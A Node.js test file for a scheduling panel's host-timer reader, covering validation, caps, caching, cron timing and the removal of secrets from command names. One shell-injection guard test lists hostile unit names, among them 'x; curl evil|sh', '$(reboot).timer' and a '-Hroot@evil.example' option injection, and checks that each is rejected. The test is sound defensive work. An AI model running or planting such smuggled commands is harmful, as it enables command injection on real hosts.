/**
 * Schedule panel PR 3: machine timers from JSON files (schedule-sources/host-timers.js). The
 * folder resolution, the caps, the schema validation, cron `next` in the file's zone, old data,
 * the basename rule, the unit-name check on copyable commands, and a generic install doing no
 * I/O beyond one stat. Tmpdirs only.
 */
import { test, beforeEach } from "node:test";
import assert from "node:assert/strict";
import * as realFs from "node:fs";
import { mkdtempSync, writeFileSync, mkdirSync, symlinkSync, rmSync, readFileSync } from "node:fs";
import { execFileSync } from "node:child_process";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  readHostTimers, hostTimersDir, validHostFile, commandName, checkCommand, _resetHostTimersCache,
  SCHEMA, MAX_FILES, MAX_FILE_BYTES, CRON_EVAL_CAP,
} from "../servers/gateway/schedule-sources/host-timers.js";

const NOW = Date.parse("2026-10-26T18:00:00Z");
const file = (over = {}) => ({ schema: SCHEMA, host: "box-1", tz: "America/Chicago", collected_at: "2026-10-26T17:45:00Z", timers: [], ...over });
beforeEach(() => _resetHostTimersCache());

/** An fs that counts every call it forwards. */
function spyFs() {
  const calls = [];
  const fs = new Proxy(realFs, { get(t, k) { const v = t[k]; if (typeof v !== "function") return v; return (...a) => { calls.push(String(k)); return v.apply(t, a); }; } });
  return { fs, calls };
}

test("the folder: CROW_HOST_TIMERS_DIR (absolute), else <CROW_HOME>/host-timers", () => {
  assert.equal(hostTimersDir({ CROW_HOST_TIMERS_DIR: "/srv/timers" }), "/srv/timers");
  assert.equal(hostTimersDir({ CROW_HOST_TIMERS_DIR: "rel/timers" }), null);
  assert.equal(hostTimersDir({ CROW_HOME: "/opt/crow-home" }), "/opt/crow-home/host-timers");
});

test("a generic install (no env, no folder) does one stat and nothing else", () => {
  const home = mkdtempSync(join(tmpdir(), "crow-ht-home-"));
  try {
    const { fs, calls } = spyFs();
    assert.equal(readHostTimers({ env: { CROW_HOME: home }, now: NOW, fs }), null);
    assert.deepEqual(calls, ["statSync"]);
  } finally { rmSync(home, { recursive: true, force: true }); }
});

test("a valid file: hosts, zones, cron next in the file's zone, systemd next/last from the file", () => {
  const dir = mkdtempSync(join(tmpdir(), "crow-ht-"));
  try {
    writeFileSync(join(dir, "box-1.json"), JSON.stringify(file({
      timers: [
        { id: "user:model-watch.timer", kind: "systemd-user", name: "model-watch", schedule: "every 2 h", next: "2026-10-26T19:00:00Z", last: "2026-10-26T17:00:00Z", last_result: "success", extra: "dropped" },
        { id: "cron:3", kind: "cron", name: "collect.sh", schedule: "0 9 * * *" },
      ],
    })));
    const out = readHostTimers({ env: { CROW_HOST_TIMERS_DIR: dir }, now: NOW });
    assert.equal(out.hosts.length, 1);
    const [h] = out.hosts;
    assert.equal(h.host, "box-1");
    assert.equal(h.stale, false);
    const [sd, cr] = h.timers;
    assert.equal(sd.next, Date.parse("2026-10-26T19:00:00Z"));
    assert.equal(sd.cadence, 120);
    assert.equal(sd.failed, false);
    assert.equal("extra" in sd, false, "unknown fields are dropped");
    assert.equal(cr.next, Date.parse("2026-10-27T14:00:00Z"), "09:00 in America/Chicago (CDT)");
    assert.equal(cr.cadence, 1440);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test("a bad file is skipped, not thrown: bad JSON, wrong schema, missing fields", () => {
  const dir = mkdtempSync(join(tmpdir(), "crow-ht-"));
  try {
    writeFileSync(join(dir, "a.json"), "{nope");
    writeFileSync(join(dir, "b.json"), JSON.stringify(file({ schema: "other/9" })));
    writeFileSync(join(dir, "c.json"), JSON.stringify(file({ collected_at: "not a date" })));
    writeFileSync(join(dir, "d.json"), JSON.stringify(file({ host: "good", timers: [{ id: "x", kind: "launchd" }, { kind: "cron" }, { id: "cron:1", kind: "cron", name: "ok.sh", schedule: "*/15 * * * *" }] })));
    writeFileSync(join(dir, "notes.txt"), "ignored");
    const out = readHostTimers({ env: { CROW_HOST_TIMERS_DIR: dir }, now: NOW });
    assert.deepEqual(out.hosts.map((h) => h.host), ["good"]);
    assert.equal(out.hosts[0].timers.length, 1, "bad entries are dropped");
    assert.equal(out.skipped, 3);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test("an oversize file, a symlink and a FIFO named x.json are skipped (no read, no block)", () => {
  const dir = mkdtempSync(join(tmpdir(), "crow-ht-"));
  try {
    const big = file({ host: "big", timers: [{ id: "cron:1", kind: "cron", name: "x".repeat(MAX_FILE_BYTES), schedule: "0 * * * *" }] });
    writeFileSync(join(dir, "big.json"), JSON.stringify(big));
    writeFileSync(join(dir, "..real"), JSON.stringify(file({ host: "linked" })));
    symlinkSync(join(dir, "..real"), join(dir, "link.json"));
    try { execFileSync("mkfifo", [join(dir, "fifo.json")]); } catch {}
    writeFileSync(join(dir, "ok.json"), JSON.stringify(file({ host: "ok" })));
    const out = readHostTimers({ env: { CROW_HOST_TIMERS_DIR: dir }, now: NOW });
    assert.deepEqual(out.hosts.map((h) => h.host), ["ok"]);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test("at most 50 files are read", () => {
  const dir = mkdtempSync(join(tmpdir(), "crow-ht-"));
  try {
    for (let i = 0; i < MAX_FILES + 5; i++) writeFileSync(join(dir, `h${String(i).padStart(3, "0")}.json`), JSON.stringify(file({ host: `h${i}` })));
    const out = readHostTimers({ env: { CROW_HOST_TIMERS_DIR: dir }, now: NOW });
    assert.equal(out.hosts.length, MAX_FILES);
    assert.equal(out.truncated, true);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test("results are cached 60 s (a second read inside the minute reads no file)", () => {
  const dir = mkdtempSync(join(tmpdir(), "crow-ht-"));
  try {
    writeFileSync(join(dir, "a.json"), JSON.stringify(file()));
    readHostTimers({ env: { CROW_HOST_TIMERS_DIR: dir }, now: NOW });
    const { fs, calls } = spyFs();
    readHostTimers({ env: { CROW_HOST_TIMERS_DIR: dir }, now: NOW + 30_000, fs });
    assert.deepEqual(calls, ["statSync"]);
    readHostTimers({ env: { CROW_HOST_TIMERS_DIR: dir }, now: NOW + 61_000, fs });
    assert.ok(calls.includes("opendirSync"), "re-read after the minute");
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test("old data: collected_at more than an hour ago", () => {
  assert.equal(validHostFile(file({ collected_at: "2026-10-26T16:59:00Z" }), { now: NOW }).stale, true);
  assert.equal(validHostFile(file({ collected_at: "2026-10-26T17:00:00Z" }), { now: NOW }).stale, false);
});

test("a failed timer: last_result other than success", () => {
  const h = validHostFile(file({ timers: [{ id: "system:backup.timer", kind: "systemd-system", name: "backup", last_result: "exit-code" }] }), { now: NOW });
  assert.equal(h.timers[0].failed, true);
  assert.equal(h.timers[0].check, "systemctl status -- backup.timer");
});

test("a cron command with arguments shows only its basename; VAR=value and cd … && are skipped", () => {
  assert.equal(commandName("/opt/lab/scripts/collect-health.sh --all --token abc"), "collect-health.sh");
  assert.equal(commandName("TOKEN=abc123 ./x --flag"), "x");
  assert.equal(commandName("A=1 B=2 /usr/bin/env python3 /srv/job.py secret"), "python3");
  assert.equal(commandName("cd /srv/app && ./run.sh --key s3cr3t"), "run.sh");
  assert.equal(commandName("cd /a; cd /b && nice -n 10 /x/backup >/dev/null 2>&1"), "backup");
  const h = validHostFile(file({ timers: [{ id: "cron:9", kind: "cron", name: "TOKEN=abc /srv/sync.sh --pass hunter2", schedule: "0 3 * * *" }] }), { now: NOW });
  assert.equal(h.timers[0].name, "sync.sh");
  assert.doesNotMatch(JSON.stringify(h), /abc|hunter2/);
});

test("names are cut to 80 chars and control characters go", () => {
  const h = validHostFile(file({ host: "box\u0007-1", timers: [{ id: "user:a.timer", kind: "systemd-user", name: "n".repeat(300) }] }), { now: NOW });
  assert.equal(h.host, "box -1");
  assert.equal(h.timers[0].name.length, 80);
});

test("the check command is offered only for a safe systemd unit name (the shell-injection guard)", () => {
  assert.equal(checkCommand({ kind: "systemd-user", id: "user:model-watch-hot.timer" }), "systemctl --user status -- model-watch-hot.timer");
  assert.equal(checkCommand({ kind: "systemd-system", id: "getty@tty1.service" }), "systemctl status -- getty@tty1.service");
  for (const bad of ["-Hroot@evil.example", "user:-Hroot@evil.example", "--host=evil", ".hidden.timer", "@x.timer", "x; curl evil|sh", "a b.timer", "$(reboot).timer", "x`id`.timer", "x\\y.timer", "user:", "a'b.timer", "x".repeat(256)]) {
    assert.equal(checkCommand({ kind: "systemd-user", id: bad }), null, bad);
  }
  assert.equal(checkCommand({ kind: "cron", id: "cron:3" }), null, "cron entries get no command");
});

const timed = (fn) => { const t = Date.now(); const v = fn(); return [v, Date.now() - t]; };

test("timing: 500 × a leap-day cron line in one file finishes under 200 ms (bounded look-ahead, capped evaluations)", () => {
  const dir = mkdtempSync(join(tmpdir(), "crow-ht-"));
  try {
    const timers = Array.from({ length: 500 }, (_, i) => ({ id: `cron:${i}`, kind: "cron", name: "x.sh", schedule: "0 3 29 2 *" }));
    writeFileSync(join(dir, "slow.json"), JSON.stringify(file({ timers })));
    const [out, ms] = timed(() => readHostTimers({ env: { CROW_HOST_TIMERS_DIR: dir }, now: NOW }));
    assert.ok(ms < 200, `took ${ms} ms`);
    assert.equal(out.hosts[0].timers.length, 500);
    assert.ok(out.hosts[0].timers.every((t) => t.next === null), "no next run inside the look-ahead");
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test("timing: the caps at their worst (50 files × 500 never-soon cron lines) finish under 200 ms", () => {
  const dir = mkdtempSync(join(tmpdir(), "crow-ht-"));
  try {
    const timers = Array.from({ length: 500 }, (_, i) => ({ id: `cron:${i}`, kind: "cron", name: "x.sh", schedule: i % 2 ? "0 0 31 2,4,6,9,11 *" : "0 3 29 2 *" }));
    for (let f = 0; f < MAX_FILES; f++) writeFileSync(join(dir, `h${f}.json`), JSON.stringify(file({ host: `h${f}`, timers })));
    const [out, ms] = timed(() => readHostTimers({ env: { CROW_HOST_TIMERS_DIR: dir }, now: NOW }));
    assert.ok(ms < 200, `took ${ms} ms`);
    assert.equal(out.hosts.length, MAX_FILES);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test("cron evaluations are capped across all files; the rest show no next run", () => {
  const dir = mkdtempSync(join(tmpdir(), "crow-ht-"));
  try {
    const timers = Array.from({ length: 150 }, (_, i) => ({ id: `cron:${i}`, kind: "cron", name: "x.sh", schedule: "0 9 * * *" }));
    writeFileSync(join(dir, "a.json"), JSON.stringify(file({ host: "a", timers })));
    writeFileSync(join(dir, "b.json"), JSON.stringify(file({ host: "b", timers })));
    const out = readHostTimers({ env: { CROW_HOST_TIMERS_DIR: dir }, now: NOW });
    const withNext = out.hosts.flatMap((h) => h.timers).filter((t) => t.next !== null).length;
    assert.equal(withNext, CRON_EVAL_CAP);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test("an unchanged file is not re-validated after the folder cache expires (name + mtime + size)", () => {
  const dir = mkdtempSync(join(tmpdir(), "crow-ht-"));
  try {
    writeFileSync(join(dir, "a.json"), JSON.stringify(file({ timers: [{ id: "cron:1", kind: "cron", name: "x.sh", schedule: "0 9 * * *" }] })));
    readHostTimers({ env: { CROW_HOST_TIMERS_DIR: dir }, now: NOW });
    const { fs, calls } = spyFs();
    readHostTimers({ env: { CROW_HOST_TIMERS_DIR: dir }, now: NOW + 61_000, fs });
    assert.ok(calls.includes("lstatSync"));
    assert.ok(!calls.includes("openSync"), `no file read: ${calls.join(",")}`);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test("the folder listing stops at the cap (it never lists or sorts a huge folder whole)", () => {
  const dir = mkdtempSync(join(tmpdir(), "crow-ht-"));
  try {
    for (let i = 0; i < 3000; i++) writeFileSync(join(dir, `n${i}.txt`), "");
    for (let i = 0; i < MAX_FILES + 20; i++) writeFileSync(join(dir, `h${i}.json`), "{}");
    let reads = 0;
    const fs = new Proxy(realFs, { get(t, k) {
      if (k !== "opendirSync") return t[k];
      return (...a) => { const d = t.opendirSync(...a); return { readSync: () => { reads++; return d.readSync(); }, closeSync: () => d.closeSync() }; };
    } });
    const [, ms] = timed(() => readHostTimers({ env: { CROW_HOST_TIMERS_DIR: dir }, now: NOW, fs }));
    assert.ok(ms < 200, `took ${ms} ms`);
    assert.ok(reads <= 3000 + MAX_FILES + 1, `${reads} entries read`);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test("the schema doc in the guide matches the schema id", () => {
  const doc = readFileSync(new URL("../docs/guide/schedule.md", import.meta.url), "utf8");
  assert.match(doc, new RegExp(SCHEMA.replace(/[./]/g, "\\$&")));
  assert.match(doc, /CROW_HOST_TIMERS_DIR/);
  assert.match(doc, /CROW_BOX_LEDGER_PATH/);
});
